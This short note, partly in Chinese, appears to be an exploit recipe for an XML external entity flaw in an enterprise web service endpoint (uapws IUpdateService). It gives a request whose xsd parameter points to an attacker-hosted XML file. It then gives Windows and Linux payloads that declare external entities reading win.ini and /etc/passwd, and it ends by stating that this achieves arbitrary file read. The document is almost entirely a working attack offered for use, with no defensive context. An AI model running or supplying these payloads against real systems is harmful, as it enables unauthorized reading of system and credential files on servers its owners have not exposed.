http://127.0.0.1/uapws/service/nc.uap.oba.update.IUpdateService?wsdl

http://127.0.0.1/uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://vps/index.xml

index.xml可以是
windows:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]><user><username>&name;</username><password>1</password></user>

linux:
evil.xml:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]><user><username>&name;</username><password>1</password></user>

执行任意文件读取